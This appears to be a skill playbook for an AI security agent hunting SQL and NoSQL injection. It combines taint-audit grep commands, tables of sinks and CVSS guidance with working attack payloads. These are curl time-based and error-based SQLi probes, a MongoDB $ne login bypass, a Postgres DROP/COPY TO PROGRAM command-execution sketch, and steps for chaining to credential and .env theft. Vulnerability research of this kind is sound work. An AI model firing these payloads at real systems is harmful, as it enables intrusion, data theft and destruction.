---
name: sql-injection
description: Hunt SQL injection (CWE-89) via source-level taint tracking. Covers string concat, format-string, ORM raw queries, second-order injection, and NoSQL injection in MongoDB/DynamoDB.
---

# SQL Injection Hunting Playbook

Classic, still the king. Modern ORMs reduce the surface area but every
codebase has escape hatches (raw queries, dynamic table names, LIKE
fragments) where taint tracking pays off.

## 1. Sources
Anything accepting untrusted input: query params, form bodies, headers,
cookies, JWT claims, file contents parsed as config, message-queue payloads.

## 2. Sinks by language/framework

| Language | Safe API                         | Dangerous API                                       |
|----------|----------------------------------|-----------------------------------------------------|
| Python   | `cursor.execute(sql, params)`    | `cursor.execute(f"... {user}")`, `%`-format         |
| Python   | SQLAlchemy `text().bindparams`   | `text(f"... {user}")`, `raw_sql`                    |
| Python   | Django ORM filter kwargs         | `Model.objects.raw(...)`, `.extra(where=[...])`     |
| Node     | `pg.query(text, params)`         | Template literals with user data                    |
| Node     | Prisma `$queryRaw\`...\``        | `$queryRawUnsafe(userString)`                       |
| Java     | `PreparedStatement`              | `Statement.executeQuery(string + user)`             |
| Java     | JPA criteria                     | `entityManager.createNativeQuery(user + sql)`       |
| Go       | `db.Query(text, args...)`        | `fmt.Sprintf` → `db.Query`                          |
| Ruby     | Rails `where("col = ?", x)`      | `where("col = '#{x}'")`, `find_by_sql(interp)`      |
| PHP      | PDO prepared                     | `mysqli_query($conn, $user . $sql)`                 |

## 3. Taint audit steps

```bash
# Semgrep covers 80% of obvious cases
semgrep --config p/sql-injection /workspace/src --sarif -o /workspace/sem-sqli.sarif
kg_ingest_sarif("/workspace/sem-sqli.sarif", "semgrep")

# Grep for the high-signal patterns semgrep misses (dynamic order/group by)
grep -rE 'ORDER BY.*\$|LIMIT.*\$|GROUP BY.*\$' /workspace/src
grep -rE 'execute\s*\(.*f["\']|execute\s*\(.*%.*%' /workspace/src

# Django raw + extra (scanner blind spot)
grep -rE '\.raw\(|\.extra\(' /workspace/src

# Second-order: anything that stores user input then queries by it unescaped
grep -rE 'INSERT INTO.*VALUES.*\?|UPDATE.*SET' /workspace/src
```

## 4. Dynamic table/column sinks — the interesting subclass

ORMs parameterize values but NOT identifiers. If the code does:
```python
cursor.execute(f"SELECT * FROM {tenant}_users WHERE id=%s", (uid,))
```
the table name is user-controlled. Check whether `tenant` is validated
against an allowlist. If not, this is trivial RCE on Postgres
(`; DROP ... ; COPY ... TO PROGRAM 'bash -c ...' --`).

## 5. NoSQL injection

| DB       | Dangerous                                    | Safe                              |
|----------|----------------------------------------------|-----------------------------------|
| MongoDB  | `db.users.find({name: req.body.name})`       | `find({name: String(req.body.name)})` |
| Firebase | `db.ref(req.query.path)`                     | path allowlist                    |
| Dynamo   | Filter expressions built from strings        | `ExpressionAttributeValues`       |

Classic Mongo bypass: `{"username": "admin", "password": {"$ne": null}}`.

## 6. Second-order injection

Most dangerous variant. The sink query reads from a previously stored
value that was user-controlled. Missed by 90% of scanners because the
taint breaks at the DB boundary.

Audit approach: any column that stores user input and is later
concatenated into another query is a candidate. Grep for the column
name across the repo.

## 7. PoC + validation contract

```bash
# Blind time-based
curl "https://target.com/search?q=1' AND SLEEP(5)-- -"
# Success: response time > 5s

# Error-based
curl "https://target.com/search?q=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"
# Success: mysql error with version string reflected
```

`validate_finding` contract:
- success_patterns: `version\(\)`, `mysql`, `postgres`, `sleep.*5`,
  `syntax error near`, `ORA-01756`
- negative_command: same URL with `q=1` (no payload)
- negative_patterns: same error string (if present without payload, it's
  unrelated noise — demote)

## 8. Default CVSS

| Variant                         | Score | Notes                          |
|---------------------------------|-------|--------------------------------|
| Authenticated read-only SQLi    | 6.5   | C:L I:N A:N, PR:L              |
| Unauth blind SQLi               | 7.5   | C:H I:N A:N, PR:N              |
| Unauth error-based SQLi         | 8.6   | C:H I:L A:N                    |
| Unauth → OS command (xp_cmdshell, COPY TO PROGRAM) | 9.8 | C:H I:H A:H |

Vector for the 9.8: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`.

## 9. Chain promotion

SQL injection often enables:
- Credential dump → `auth_as` edge → internal user node
- File read → `leaks` edge → secret node (config.php, .env)
- xp_cmdshell → `enables` edge → new shell/rce node
